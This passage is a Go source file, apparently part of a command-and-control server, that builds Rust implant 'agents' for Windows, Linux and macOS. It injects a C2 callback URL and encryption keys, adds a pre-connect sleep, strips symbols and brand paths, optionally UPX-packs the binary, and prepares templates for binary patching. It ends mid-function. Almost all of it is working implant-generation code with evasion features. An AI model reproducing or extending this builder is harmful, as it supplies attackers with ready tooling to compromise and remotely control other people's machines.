package services

import (
	"bufio"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"cupcake-server/pkg/paths"
	"cupcake-server/internal/storage"
	"cupcake-server/pkg/utils"

	"github.com/google/uuid"
)

const (
	// defaultClientSourceRel is used when absolute resolution fails (server cwd = server/).
	defaultClientSourceRel = "../Client"
	BuildBaseDir           = "./temp_builds" // Sandbox root

	// cargoAgentBinName must match Client/core/Cargo.toml [[bin]] name.
	// (Renamed from package-default cupcake-core to avoid Windows PDB clash with lib cupcake_core.)
	cargoAgentBinName = "cupcake-agent"
	// Legacy name if an old workspace still emits the package-default bin.
	cargoAgentBinLegacy = "cupcake-core"
)

// ArtifactDir / SharedTargetDir / isolatedCargoHome resolve under CUPCAKE_DATA_DIR.
func artifactDir() string    { return paths.Join("payloads") }
func sharedTargetDir() string { return paths.Join("build_cache", "target") }
func isolatedCargoHomeDir() string {
	return paths.Join("build_cache", "cargo_home")
}

// resolveClientSourceDir finds Client/ for dynamic source builds.
// Prefer: env CUPCAKE_CLIENT_DIR → <exeDir>/../Client → <cwd>/../Client → <cwd>/Client.
func resolveClientSourceDir() (string, error) {
	if v := strings.TrimSpace(os.Getenv("CUPCAKE_CLIENT_DIR")); v != "" {
		if st, err := os.Stat(filepath.Join(v, "core", "src", "config.rs")); err == nil && !st.IsDir() {
			return filepath.Abs(v)
		}
	}
	var candidates []string
	if exe, err := os.Executable(); err == nil {
		exeDir := filepath.Dir(exe)
		candidates = append(candidates,
			filepath.Join(exeDir, "..", "Client"),
			filepath.Join(exeDir, "Client"),
		)
	}
	if cwd, err := os.Getwd(); err == nil {
		candidates = append(candidates,
			filepath.Join(cwd, "..", "Client"),
			filepath.Join(cwd, "Client"),
			filepath.Join(cwd, defaultClientSourceRel),
		)
	}
	candidates = append(candidates, defaultClientSourceRel)
	for _, c := range candidates {
		abs, err := filepath.Abs(c)
		if err != nil {
			continue
		}
		if st, err := os.Stat(filepath.Join(abs, "core", "src", "config.rs")); err == nil && !st.IsDir() {
			return abs, nil
		}
	}
	return "", fmt.Errorf("Client source not found (set CUPCAKE_CLIENT_DIR); tried under exe/cwd")
}

type PayloadConfig struct {
	Arch              string `json:"arch"`
	Protocol          string `json:"protocol"`
	Host              string `json:"host"`
	Port              string `json:"port"`
	AESKey            string `json:"aes_key"`
	HeartbeatInterval int    `json:"heartbeat_interval"`
	DNSResolver       string `json:"dns_resolver"`
	OSType            string `json:"os_type"`
	AutoDestruct      bool   `json:"auto_destruct"`
	SleepTime         int    `json:"sleep_time"`
	UseUPX            bool   `json:"use_upx"`
	EncryptionSalt    string `json:"encryption_salt"`
	ObfuscationMode   string `json:"obfuscation_mode"`
	Jitter            int    `json:"jitter"`
	// EnableTLS forces wss:// + ws-tls cargo features when protocol is WebSocket.
	EnableTLS bool `json:"enable_tls"`
	// TemplateMode leaves REPLACE_ME_* placeholders (for assets/ binary-patch templates).
	// Dynamic operator builds must leave this false so URL/AES are source-injected.
	TemplateMode bool `json:"template_mode"`
	// Profile is connection *direction* for UI (reverse/forward), NOT a cargo capability tier.
	// Stage0 cargo features are always **minimal** (sole product aggregate).
	// Heavy caps: L2 modules (bof / inject / ad).
	Profile string `json:"profile"`
}

// transportKind normalizes listener/UI protocol names for URL + cargo features.
// Returns: ws | wss | tcp | dns | bind
func transportKind(protocol string, enableTLS bool) string {
	p := strings.ToLower(strings.TrimSpace(protocol))
	p = strings.ReplaceAll(p, "_", "-")
	switch p {
	case "tcp":
		return "tcp"
	case "dns":
		return "dns"
	case "bind-tcp", "bind", "正向tcp", "forward-tcp", "forward":
		return "bind"
	case "wss":
		return "wss"
	case "ws", "websocket", "web-socket", "":
		if enableTLS {
			return "wss"
		}
		return "ws"
	default:
		// Unknown labels (e.g. localized) → WS; TLS still upgrades
		if enableTLS {
			return "wss"
		}
		return "ws"
	}
}

func buildConnString(kind, host, port, dnsHost string) string {
	host = strings.TrimSpace(host)
	port = strings.TrimSpace(port)
	switch kind {
	case "tcp":
		return fmt.Sprintf("tcp://%s:%s", host, port)
	case "dns":
		h := strings.TrimSpace(dnsHost)
		if h == "" {
			h = host
		}
		if strings.HasPrefix(strings.ToLower(h), "dns://") {
			return h
		}
		return fmt.Sprintf("dns://%s", h)
	case "bind":
		return fmt.Sprintf("bind://0.0.0.0:%s", port)
	case "wss":
		return fmt.Sprintf("wss://%s:%s/socket", host, port)
	default: // ws
		return fmt.Sprintf("ws://%s:%s/socket", host, port)
	}
}

func cargoFeaturesForKind(kind string) string {
	// Sole product tier: minimal (+ net pulled by transport feature)
	switch kind {
	case "tcp":
		return "tcp,minimal"
	case "bind":
		return "tcp_bind,minimal"
	case "dns":
		return "dns,minimal"
	case "wss":
		return "ws,ws-tls,minimal"
	default:
		return "ws,minimal"
	}
}

// constStillPlaceholder reports whether `pub const NAME: &str = "PLACEHOLDER"` remains.
// Comparison literals like `REMOTE_STUB != "REPLACE_ME_URL"` MUST stay unpatched
// (patchRustStrConst only rewrites the const definition) — do not use plain Contains.
func constStillPlaceholder(src, name, placeholder string) bool {
	return strings.Contains(src, fmt.Sprintf(`pub const %s: &str = "%s"`, name, placeholder))
}

// verifyPatchedConfigSource checks dynamic source patch succeeded on config.rs.
func verifyPatchedConfigSource(src string) error {
	if constStillPlaceholder(src, "REMOTE_STUB", "REPLACE_ME_URL") {
		return fmt.Errorf("REMOTE_STUB const still REPLACE_ME_URL")
	}
	if constStillPlaceholder(src, "AES_KEY", "REPLACE_ME_AES_KEY") {
		return fmt.Errorf("AES_KEY const still REPLACE_ME_AES_KEY")
	}
	// Runtime uses is_builder_sentinel() on the const value — no need for a
	// leftover `!= "REPLACE_ME_URL"` comparison literal in the agent image.
	return nil
}

// verifyAgentBinaryConfig ensures dynamic builds actually embedded C2 config
// (guards against stale shared-target artifacts and failed source patch).
func verifyAgentBinaryConfig(binPath, expectURL string, templateMode bool) error {
	raw, err := os.ReadFile(binPath)
	if err != nil {
		return fmt.Errorf("read artifact: %w", err)
	}
	s := string(raw)
	if templateMode {
		// Templates must keep placeholders for PatchPayload / REMOTE_STUB checks
		if !strings.Contains(s, "REPLACE_ME_URL") && !strings.Contains(s, "SERVICE_PROVIDER_MAPPING") {
			return fmt.Errorf("template binary missing URL placeholders (not usable for patch mode)")
		}
		return nil
	}
	// After source patch the const holds the real C2 URL (no comparison sentinel).
	// Verify the injected host:port appears in the linked agent.

	expectURL = strings.TrimSpace(expectURL)
	if expectURL != "" {
		needle := expectURL
		if i := strings.Index(expectURL, "://"); i >= 0 {
			needle = expectURL[i+3:]
		}
		if j := strings.IndexAny(needle, "/?"); j >= 0 {
			needle = needle[:j]
		}
		if needle != "" && !strings.Contains(s, needle) {
			return fmt.Errorf("artifact missing injected C2 host %q — wrong binary picked from shared target?", needle)
		}
	}
	return nil
}

// copyDir recursively copies a directory tree
func copyDir(src, dst string) error {
	return filepath.Walk(src, func(path string, info os.FileInfo, err error) error {
		if err != nil { return err }
		relPath, _ := filepath.Rel(src, path)
		
		// 🛡️ Skip target folders, git history, and other heavy/unnecessary files
		name := info.Name()
		if info.IsDir() && (name == "target" || name == ".git" || name == ".idea" || name == ".vscode") {
			return filepath.SkipDir
		}
		
		dstPath := filepath.Join(dst, relPath)
		if info.IsDir() { return os.MkdirAll(dstPath, info.Mode()) }
		
		sf, err := os.Open(path); if err != nil { return err }; defer sf.Close()
		df, err := os.Create(dstPath); if err != nil { return err }; defer df.Close()
		if _, err := io.Copy(df, sf); err != nil { return err }
		return os.Chmod(dstPath, info.Mode())
	})
}

// validateC2Host ensures the C2 callback host is a valid hostname or IP:port,
// without path separators or shell metacharacters that could cause code injection.
func validateC2Host(host string) error {
	if host == "" {
		return fmt.Errorf("C2 host is required")
	}
	// Reject path separators and shell metacharacters
	bad := []string{"/", "\\", ";", "&", "|", "`", "$", "\n", "\r", "\"", "'", "<", ">", "(", ")", "{", "}", "[", "]"}
	for _, ch := range bad {
		if strings.Contains(host, ch) {
			return fmt.Errorf("C2 host contains invalid character: %q", ch)
		}
	}
	return nil
}

// ensureIsolatedCargoHome creates a CARGO_HOME that ignores user ~/.cargo/config.toml
// (which often forces replace-with=ustc behind a dead 127.0.0.1 proxy), while reusing
// the user's registry/git caches via directory junctions (Windows) or symlinks.
func ensureIsolatedCargoHome(logChan chan<- string) (string, error) {
	home, err := filepath.Abs(isolatedCargoHomeDir())
	if err != nil {
		return "", err
	}
	if err := os.MkdirAll(home, 0755); err != nil {
		return "", err
	}
	cfg := `# Isolated Cupcake build CARGO_HOME — no crates-io replace-with.
# Registry cache is linked from the user cargo home when available.
[registries.crates-io]
protocol = "sparse"

[net]
git-fetch-with-cli = true
`
	if err := os.WriteFile(filepath.Join(home, "config.toml"), []byte(cfg), 0644); err != nil {
		return "", err
	}

	userCargo := os.Getenv("CARGO_HOME")
	if userCargo == "" {
		if up := os.Getenv("USERPROFILE"); up != "" {
			userCargo = filepath.Join(up, ".cargo")
		} else if h := os.Getenv("HOME"); h != "" {
			userCargo = filepath.Join(h, ".cargo")
		}
	}
	for _, name := range []string{"registry", "git"} {
		src := filepath.Join(userCargo, name)
		dst := filepath.Join(home, name)
		if _, err := os.Stat(src); err != nil {
			continue
		}
		if fi, err := os.Lstat(dst); err == nil {
			// Already present (junction/dir) — keep
			_ = fi
			continue
		}
		if err := linkCargoCacheDir(src, dst); err != nil {
			if logChan != nil {
				logChan <- fmt.Sprintf("[Builder] 警告: 无法链接 cargo %s 缓存 (%v)，将使用独立缓存", name, err)
			}
		} else if logChan != nil {
			logChan <- fmt.Sprintf("[Builder] 已链接用户 cargo/%s 缓存 → 隔离 CARGO_HOME", name)
		}
	}
	return home, nil
}

func linkCargoCacheDir(src, dst string) error {
	// Prefer Windows junction (no admin); fall back to symlink / plain copy skip.
	if runtime.GOOS == "windows" {
		cmd := exec.Command("cmd", "/C", "mklink", "/J", dst, src)
		if out, err := cmd.CombinedOutput(); err != nil {
			return fmt.Errorf("mklink /J: %v (%s)", err, strings.TrimSpace(string(out)))
		}
		return nil
	}
	return os.Symlink(src, dst)
}

// cargoBuildEnv builds a clean environment for cargo: isolated CARGO_HOME, no dead proxies.
func cargoBuildEnv(absTargetDir, absWorkspace, cargoHome string) []string {
	base := os.Environ()
	strip := map[string]bool{
		"HTTP_PROXY": true, "HTTPS_PROXY": true, "ALL_PROXY": true,
		"http_proxy": true, "https_proxy": true, "all_proxy": true,
		"FTP_PROXY": true, "ftp_proxy": true,
		"CARGO_HOME": true, // replace below
	}
	out := make([]string, 0, len(base)+16)
	for _, kv := range base {
		eq := strings.IndexByte(kv, '=')
		if eq <= 0 {
			continue
		}
		key := kv[:eq]
		if strip[key] || strip[strings.ToUpper(key)] {
			continue
		}
		out = append(out, kv)
	}
	wireSeed := utils.WireSeed()
	// Neutral remap prefixes (no product brand in debug paths)
	out = append(out,
		"HTTP_PROXY=",
		"HTTPS_PROXY=",
		"ALL_PROXY=",
		"http_proxy=",
		"https_proxy=",
		"all_proxy=",
		"CARGO_TERM_COLOR=never",
		"CARGO_REGISTRIES_CRATES_IO_PROTOCOL=sparse",
		fmt.Sprintf("CARGO_HOME=%s", cargoHome),
		fmt.Sprintf("CARGO_TARGET_DIR=%s", absTargetDir),
		fmt.Sprintf("CUPCAKE_WIRE_SEED=%s", wireSeed),
		fmt.Sprintf("RUSTFLAGS=-C strip=symbols --remap-path-prefix %s=/src --remap-path-prefix %s=/home", absWorkspace, os.Getenv("USERPROFILE")),
	)
	return out
}

// runCargoBuild starts cargo with streaming logs; returns wait error.
func runCargoBuild(workspace string, args []string, env []string, logChan chan<- string) error {
	cmd := exec.Command("cargo", args...)
	cmd.Dir = workspace
	cmd.Env = env

	pipeReader, pipeWriter := io.Pipe()
	cmd.Stdout = pipeWriter
	cmd.Stderr = pipeWriter

	if logChan != nil {
		logChan <- fmt.Sprintf("[Builder] 执行命令: cargo %s", strings.Join(args, " "))
	}

	if err := cmd.Start(); err != nil {
		return fmt.Errorf("failed to start cargo: %v", err)
	}

	go func() {
		scanner := bufio.NewScanner(pipeReader)
		// cargo lines can be long
		buf := make([]byte, 0, 64*1024)
		scanner.Buffer(buf, 1024*1024)
		for scanner.Scan() {
			line := scanner.Text()
			if logChan != nil {
				select {
				case logChan <- line:
				default:
				}
				if strings.Contains(line, "Compiling") && strings.Contains(line, "cupcake-core") {
					logChan <- "\x1b[35m[Builder] 编译阶段基本完成，正在进入全局链接与 LTO 体积优化阶段...\x1b[0m"
					logChan <- "\x1b[33m[Builder] 提示：该步涉及跨模块重组，耗时较长（约 30s），请耐心等待窗口自动弹出。\x1b[0m"
				}
			}
		}
		pipeReader.Close()
	}()

	waitErr := cmd.Wait()
	pipeWriter.Close()
	return waitErr
}

// BuildAgentWithLogger compiles the Rust agent in a sandboxed environment and streams logs
func BuildAgentWithLogger(conf PayloadConfig, logChan chan<- string) (string, error) {
	buildID := uuid.New().String()
	workspace := filepath.Join(BuildBaseDir, buildID)
	buildStarted := time.Now()

	os.MkdirAll(BuildBaseDir, 0755)
	os.MkdirAll(artifactDir(), 0755)
	os.MkdirAll(sharedTargetDir(), 0755)

	sourceDir, err := resolveClientSourceDir()
	if err != nil {
		return "", err
	}
	if logChan != nil {
		logChan <- "[Builder] 正在准备沙箱环境 (已启用增量编译缓存)..."
		logChan <- fmt.Sprintf("[Builder] Client source: %s", sourceDir)
	}
	if err := copyDir(sourceDir, workspace); err != nil {
		return "", fmt.Errorf("failed to create sandbox from %s: %v", sourceDir, err)
	}
	defer os.RemoveAll(workspace)

	cargoHome, err := ensureIsolatedCargoHome(logChan)
	if err != nil {
		return "", fmt.Errorf("failed to prepare isolated CARGO_HOME: %v", err)
	}
	if logChan != nil {
		logChan <- "[Builder] 使用隔离 CARGO_HOME（忽略用户 ustc 镜像）；已清除 HTTP(S)_PROXY"
	}

	// Bind mode has no outbound host; other modes need a callback host.
	kind := transportKind(conf.Protocol, conf.EnableTLS)
	if kind != "bind" {
		if err := validateC2Host(conf.Host); err != nil {
			return "", fmt.Errorf("invalid C2 host: %v", err)
		}
	}

	connStr := buildConnString(kind, conf.Host, conf.Port, conf.Host)
	features := cargoFeaturesForKind(kind)

	if logChan != nil {
		logChan <- "[Builder] core engine init (dynamic source build)"
		logChan <- fmt.Sprintf("[Builder] wire_seed=%s (Noise/reg-proof/module domain — must match running server)", utils.WireSeed())
		logChan <- fmt.Sprintf("[Builder] transport=%s protocol_in=%q tls=%v features=%s", kind, conf.Protocol, conf.EnableTLS, features)
		if !conf.TemplateMode {
			logChan <- fmt.Sprintf("[Builder] inject URL=%s", connStr)
			// Reverse agents with 127.0.0.1 only work on the C2 host itself.
			h := strings.TrimSpace(conf.Host)
			if kind != "bind" && (h == "127.0.0.1" || h == "localhost" || h == "::1") {
				logChan <- "\x1b[33m[Builder] 警告: 回连地址是本机环回 — 仅本机 agent 能上线；跨机请填 C2 真实 IP/域名\x1b[0m"
			}
			logChan <- fmt.Sprintf("[Builder] startup sleep_time=%ds (panel setting; 0=立即回连)", conf.SleepTime)
			if conf.SleepTime > 0 {
				logChan <- "\x1b[33m[Builder] 提示: agent 首次连接前会休眠 sleep_time 秒；联调可设 CUPCAKE_SKIP_SANDBOX_SLEEP=1 跳过\x1b[0m"
			}
		} else {
			logChan <- "[Builder] template mode: leaving REPLACE_ME_* placeholders for binary patch"
		}
	}

	configPath := filepath.Join(workspace, "core", "src", "config.rs")

	// Fetch System AES Key if none provided (dynamic builds only)
	aesKey := conf.AESKey
	if !conf.TemplateMode {
		if aesKey == "" {
			aesKey = store.GetSetting("system_aes_key")
			if logChan != nil {
				logChan <- "[Builder] using system AES material"
			}
		}
		// Per-build unique salt when listener salt empty (Noise PSK is base AES only)
		salt := strings.TrimSpace(conf.EncryptionSalt)
		if salt == "" {
			if s, err := utils.RandomAlphaString(24); err == nil {
				salt = s
			} else {
				salt = fmt.Sprintf("s%016x", time.Now().UnixNano())
			}
			if logChan != nil {
				logChan <- "[Builder] minted unique KDF salt for this payload"
			}
		}
		if logChan != nil {
			logChan <- "[Builder] injecting endpoint + crypto into config.rs..."
		}
		if err := patchConfig(configPath, connStr, aesKey, conf.HeartbeatInterval, conf.Jitter, conf.DNSResolver, salt, conf.ObfuscationMode, conf.SleepTime); err != nil {
			return "", fmt.Errorf("config patch failed: %v", err)
		}
		// Fail fast only if pub const definitions still hold placeholders.
		// Comparison literals (`!= "REPLACE_ME_URL"`) intentionally remain — plain Contains would false-fail.
		patched, _ := os.ReadFile(configPath)
		if err := verifyPatchedConfigSource(string(patched)); err != nil {
			return "", fmt.Errorf("config patch incomplete: %v", err)
		}
		if logChan != nil {
			logChan <- "\x1b[32m[Builder] 配置注入成功 (URL/AES/salt/obf/jitter)\x1b[0m"
			logChan <- fmt.Sprintf("[Builder] AES key length=%d obf=%q", len(strings.TrimSpace(aesKey)), conf.ObfuscationMode)
		}
	} else if logChan != nil {
		logChan <- "[Builder] skip source config patch (template placeholders retained)"
	}

	if logChan != nil {
		logChan <- "\x1b[36m[Builder] 准备 cargo 编译（杀软占用时可能变慢）...\x1b[0m"
	}

	args := []string{"build", "-p", "cupcake-core", "--release"}

	// Sanitize OS and Arch to prevent path traversal, then normalize arch aliases.
	conf.OSType = filepath.Base(strings.TrimSpace(conf.OSType))
	conf.Arch = filepath.Base(strings.TrimSpace(conf.Arch))
	normArch := normalizeBuildArch(conf.Arch)
	target := resolveCargoTarget(conf.OSType, normArch, runtime.GOOS)
	cross := isCargoCrossCompile(conf.OSType, normArch, runtime.GOOS, runtime.GOARCH)

	// Only append --target when cross-compiling (native host uses default host triple).
	if target != "" && cross {
		args = append(args, "--target", target)
		if logChan != nil {
			logChan <- fmt.Sprintf("[Builder] cross-compile --target %s (os=%s arch=%s→%s)", target, conf.OSType, conf.Arch, normArch)
		}
	} else if logChan != nil {
		logChan <- fmt.Sprintf("[Builder] host-native build (os=%s arch=%s→%s)", conf.OSType, conf.Arch, normArch)
	}

	// Sole product cargo tier: always minimal
	if p := strings.ToLower(strings.TrimSpace(conf.Profile)); p != "" {
		switch p {
		case "standard", "full", "beacon":
			if logChan != nil {
				logChan <- fmt.Sprintf("[Builder] legacy profile %q ignored → cargo minimal", p)
			}
		}
	}
	if logChan != nil {
		if kind == "bind" {
			logChan <- "[Builder] 正向客户端 — tcp_bind + minimal"
		} else {
			logChan <- "[Builder] 反向客户端 — minimal（重能力走 L2 模块）"
		}
	}
	args = append(args, "--no-default-features", "--features", features)

	// Isolate cargo target by transport+arch so ws/tcp builds never share cupcake-agent.exe
	// (shared single release/ previously allowed a stale wrong-feature binary to be shipped).
	featureKey := strings.ReplaceAll(features, ",", "_")
	featureKey = strings.ReplaceAll(featureKey, "-", "_")
	archKey := normArch
	if archKey == "" {
		archKey = "host"
	}
	targetSub := filepath.Join(sharedTargetDir(), featureKey+"_"+archKey)
	_ = os.MkdirAll(targetSub, 0755)
	absTargetDir, _ := filepath.Abs(targetSub)
	absWorkspace, _ := filepath.Abs(workspace)
	env := cargoBuildEnv(absTargetDir, absWorkspace, cargoHome)

	if logChan != nil {
		logChan <- fmt.Sprintf("[Builder] CARGO_TARGET_DIR=%s", absTargetDir)
		logChan <- "[Builder] 策略: 优先 --offline → 失败再在线（无系统代理）"
		logChan <- "[Builder] 尝试离线编译 (--offline)..."
	}

	// Offline-first
	offlineArgs := append(append([]string{}, args...), "--offline")
	waitErr := runCargoBuild(workspace, offlineArgs, env, logChan)
	if waitErr != nil {
		if logChan != nil {
			logChan <- fmt.Sprintf("[Builder] 离线未成功 (%v)，改为在线编译...", waitErr)
		}
		waitErr = runCargoBuild(workspace, args, env, logChan)
		if waitErr != nil {
			return "", fmt.Errorf("cargo build failed: %v；若仍访问 ustc/代理失败：检查 ~/.cargo/config.toml 的 replace-with，或运行 Client/scripts/cargo-use-local-cache.ps1", waitErr)
		}
	}

	// Locate cargo [[bin]] artifact (cupcake-agent; legacy cupcake-core fallback).
	builtPath, err := findCargoAgentBinary(absTargetDir, target, cross, conf.OSType == "windows")
	if err != nil {
		return "", err
	}
	// Reject stale binaries left from an older failed/partial link
	if st, err := os.Stat(builtPath); err == nil {
		if st.ModTime().Before(buildStarted.Add(-2 * time.Second)) {
			return "", fmt.Errorf("agent binary mtime %v is older than build start %v — refusing stale shared-target artifact", st.ModTime(), buildStarted)
		}
	}
	if logChan != nil {
		logChan <- fmt.Sprintf("[Builder] located agent binary: %s", builtPath)
	}

	// Verify source injection actually landed in the PE (dynamic path reconnect guarantee)
	if err := verifyAgentBinaryConfig(builtPath, connStr, conf.TemplateMode); err != nil {
		return "", fmt.Errorf("post-build config verify failed: %v", err)
	}
	if logChan != nil {
		logChan <- "[Builder] post-build config verify OK"
	}

	ext := ""
	if conf.OSType == "windows" {
		ext = ".exe"
	}
	randSuffix, _ := utils.RandomAlphaString(8)
	finalPath := filepath.Join(artifactDir(), fmt.Sprintf("%s%s", randSuffix, ext))

	if logChan != nil {
		logChan <- "[Builder] 写出载荷到 payloads/..."
	}
	// Copy then remove so a concurrent builder still has a cache hit path if needed
	if err := copyFile(builtPath, finalPath); err != nil {
		if err2 := moveFile(builtPath, finalPath); err2 != nil {
			return "", fmt.Errorf("failed to save artifact: copy=%v move=%v", err, err2)
		}
	}

	if conf.UseUPX {
		if logChan != nil {
			logChan <- "[Builder] 警告: UPX 会显著提高 AV 检出率，仅建议在实验环境使用..."
			logChan <- "[Builder] 正在执行 UPX 压缩..."
		}
		if err := RunUPX(finalPath); err != nil {
			if logChan != nil {
				logChan <- "[!] UPX 失败: " + err.Error()
			}
		} else if logChan != nil {
			logChan <- "[+] UPX 压缩成功"
		}
	}

	if logChan != nil {
		logChan <- "[Builder] 构建成功!"
	}
	return finalPath, nil
}

// RunUPX 执行 UPX 压缩
func RunUPX(path string) error {
	cmd := exec.Command("upx", "-9", "--force", path)
	return cmd.Run()
}

// normalizeBuildArch maps UI/API arch aliases to Go-like tokens: amd64, 386, arm64, arm.
// Accepts: x64, amd64, x86_64, windows_amd64, i386, x86, arm64, aarch64, arm, ...
func normalizeBuildArch(arch string) string {
	a := strings.ToLower(strings.TrimSpace(arch))
	a = strings.ReplaceAll(a, "-", "_")
	// Strip OS_ prefix if present (windows_amd64 → amd64).
	for _, prefix := range []string{"windows_", "linux_", "darwin_", "macos_"} {
		if strings.HasPrefix(a, prefix) {
			a = strings.TrimPrefix(a, prefix)
			break
		}
	}
	if a == "" {
		return "amd64"
	}
	// Order matters: x86_64 / amd64 / x64 before bare x86.
	switch {
	case a == "x64" || a == "amd64" || a == "x86_64" || a == "x86_64_v2" ||
		strings.Contains(a, "amd64") || strings.Contains(a, "x86_64") || strings.Contains(a, "x64"):
		return "amd64"
	case a == "arm64" || a == "aarch64" || strings.Contains(a, "arm64") || strings.Contains(a, "aarch64"):
		return "arm64"
	case a == "x86" || a == "i386" || a == "i686" || a == "386" ||
		strings.Contains(a, "i386") || strings.Contains(a, "i686") ||
		(strings.Contains(a, "x86") && !strings.Contains(a, "x64") && !strings.Contains(a, "amd64")):
		return "386"
	case a == "arm" || a == "armv7" || (strings.Contains(a, "arm") && !strings.Contains(a, "arm64")):
		return "arm"
	default:
		return a
	}
}

// resolveCargoTarget picks a rustc target triple for the desired OS + normalized arch.
// hostGOOS is used only to choose windows-gnu vs windows-msvc when building on Linux vs Windows.
func resolveCargoTarget(osType, normArch, hostGOOS string) string {
	osType = strings.ToLower(strings.TrimSpace(osType))
	switch osType {
	case "windows":
		if hostGOOS == "linux" {
			switch normArch {
			case "amd64":
				return "x86_64-pc-windows-gnu"
			case "386":
				return "i686-pc-windows-gnu"
			default:
				return "x86_64-pc-windows-gnu"
			}
		}
		switch normArch {
		case "amd64":
			return "x86_64-pc-windows-msvc"
		case "386":
			return "i686-pc-windows-msvc"
		default:
			return "x86_64-pc-windows-msvc"
		}
	case "linux":
		switch normArch {
		case "arm64":
			return "aarch64-unknown-linux-musl"
		case "arm":
			return "armv7-unknown-linux-musleabihf"
		case "386":
			return "i686-unknown-linux-musl"
		default:
			return "x86_64-unknown-linux-musl"
		}
	case "darwin", "macos":
		switch normArch {
		case "arm64":
			return "aarch64-apple-darwin"
		default:
			return "x86_64-apple-darwin"
		}
	default:
		return ""
	}
}

// isCargoCrossCompile reports whether cargo needs an explicit --target.
func isCargoCrossCompile(osType, normArch, hostGOOS, hostGOARCH string) bool {
	osType = strings.ToLower(strings.TrimSpace(osType))
	if osType == "macos" {
		osType = "darwin"
	}
	if hostGOOS != osType {
		return true
	}
	// Map host GOARCH to same vocabulary as normalizeBuildArch.
	host := hostGOARCH
	switch host {
	case "amd64", "arm64", "arm", "386":
		// ok
	default:
		host = normalizeBuildArch(host)
	}
	return host != normArch
}

// agentBinaryCandidates returns preferred then legacy cargo bin basenames (with optional .exe).
func agentBinaryCandidates(windows bool) []string {
	names := []string{cargoAgentBinName, cargoAgentBinLegacy}
	if !windows {
		return names
	}
	out := make([]string, 0, len(names))
	for _, n := range names {
		out = append(out, n+".exe")
	}
	return out
}

// findCargoAgentBinary locates the built Stage0 binary under CARGO_TARGET_DIR.
// When cross is true, looks under target/<triple>/release; else target/release.
// Tries cupcake-agent first, then legacy cupcake-core.
func findCargoAgentBinary(absTargetDir, cargoTarget string, cross, windows bool) (string, error) {
	var dirs []string
	if cross && cargoTarget != "" {
		dirs = append(dirs, filepath.Join(absTargetDir, cargoTarget, "release"))
	}
	// Always also try host-native path (covers mis-detected cross and default builds).
	dirs = append(dirs, filepath.Join(absTargetDir, "release"))

	var tried []string
	for _, dir := range dirs {
		for _, name := range agentBinaryCandidates(windows) {
			p := filepath.Join(dir, name)
			tried = append(tried, p)
			if st, err := os.Stat(p); err == nil && !st.IsDir() {
				return p, nil
			}
		}
	}
	return "", fmt.Errorf(
		"binary not found (looked for %s / %s under release). tried: %s — ensure Client/core Cargo.toml [[bin]] name matches builder (%s)",
		cargoAgentBinName, cargoAgentBinLegacy, strings.Join(tried, "; "), cargoAgentBinName,
	)
}

// RebuildTemplates rebuilds all platform templates (always cargo **minimal**) into server/assets
// for Patch mode. Legacy OutName `*_minimal` kept as compatible aliases of the same binary.
func RebuildTemplates(logChan chan<- string) error {
	if logChan != nil { logChan <- "[Rebuilder] 启动全平台模板构建（唯一产品档 minimal）..." }
	
	targets := []struct {
		OS       string
		Arch     string
		Protocol string
		OutName  string
		Profile  string // always "minimal" (sole product cargo tier)
	}{
		{"windows", "amd64", "ws", "client_template_windows.exe", "minimal"},
		{"windows", "i386", "ws", "client_template_windows_x86.exe", "minimal"},
		{"windows", "amd64", "tcp", "client_template_windows_tcp.exe", "minimal"},
		{"windows", "amd64", "tcp", "client_template_windows_tcp_minimal.exe", "minimal"},
		{"windows", "amd64", "dns", "client_template_windows_dns.exe", "minimal"},
		{"windows", "amd64", "bind-tcp", "client_template_windows_bind.exe", "minimal"},
		{"linux", "amd64", "ws", "client_template_linux", "minimal"},
		{"linux", "amd64", "tcp", "client_template_linux_tcp", "minimal"},
		{"linux", "amd64", "tcp", "client_template_linux_tcp_minimal", "minimal"},
		{"linux", "arm64", "ws", "client_template_linux_arm64", "minimal"},
	}

	for _, t := range targets {
		// TemplateMode: do NOT source-patch REPLACE_ME_* — PatchPayload binary-injects
		// URL/AES later. Hardcoding 127.0.0.1 into REMOTE_STUB would make all patched
		// agents call localhost (get_server_url prefers REMOTE_STUB over templates).
		conf := PayloadConfig{
			OSType:            t.OS,
			Arch:              t.Arch,
			Protocol:          t.Protocol,
			Host:              "127.0.0.1",
			Port:              "8080",
			AESKey:            "", // unused in TemplateMode
			HeartbeatInterval: 10,
			Profile:           t.Profile,
			UseUPX:            false,
			TemplateMode:      true,
		}
		
		if logChan != nil { logChan <- fmt.Sprintf("[Rebuilder] 正在编译模板: %s...", t.OutName) }
		path, err := BuildAgentWithLogger(conf, nil)
		if err != nil {
			if logChan != nil { logChan <- fmt.Sprintf("[!] 模板编译失败 (%s): %v", t.OutName, err) }
			continue
		}
		
		// Move to assets
		dest := filepath.Join("assets", t.OutName)
		if err := os.Rename(path, dest); err != nil {
			// Try copy if rename fails across partitions
			if err := copyFile(path, dest); err == nil {
				os.Remove(path)
			}
		}
		if logChan != nil { logChan <- fmt.Sprintf("[+] 模板已就绪: assets/%s", t.OutName) }
	}

	if logChan != nil { logChan <- "[Rebuilder] v3.0.1 模板集更新完成。" }
	return nil
}

// Extension of services to support cloning for shellcode
func copyFile(src, dst string) error {
	sf, err := os.Open(src); if err != nil { return err }; defer sf.Close()
	df, err := os.Create(dst); if err != nil { return err }; defer df.Close()
	_, err = io.Copy(df, sf)
	return err
}

// patchRustStrConst replaces exactly one `pub const NAME: &str = "PLACEHOLDER";`.
// Comparison literals like `REMOTE_STUB != "REPLACE_ME_URL"` must remain unpatched
// so unpatched product builds still detect placeholders correctly.
func patchRustStrConst(src, name, placeholder, value string) (string, error) {
	if strings.ContainsAny(value, "\"\\") {
		return src, fmt.Errorf("builder: %s value contains illegal quote/backslash", name)
	}
	old := fmt.Sprintf(`pub const %s: &str = "%s"`, name, placeholder)
	neu := fmt.Sprintf(`pub const %s: &str = "%s"`, name, value)
	if !strings.Contains(src, old) {
		return src, fmt.Errorf("builder: const %s = %q missing in config.rs", name, placeholder)
	}
	out := strings.Replace(src, old, neu, 1)
	if strings.Contains(out, old) {
		return src, fmt.Errorf("builder: const %s still has placeholder after patch", name)
	}
	return out, nil
}

func patchConfig(path, connStr, aesKey string, heartbeat int, jitter int, dnsResolver string, salt string, obfMode string, sleepSecs int) error {
	content, err := os.ReadFile(path)
	if err != nil {
		return err
	}
	s := string(content)
	connStr = strings.TrimSpace(connStr)
	if connStr == "" {
		return fmt.Errorf("builder: empty C2 URL (listener public host/port?)")
	}

	// 1. URL
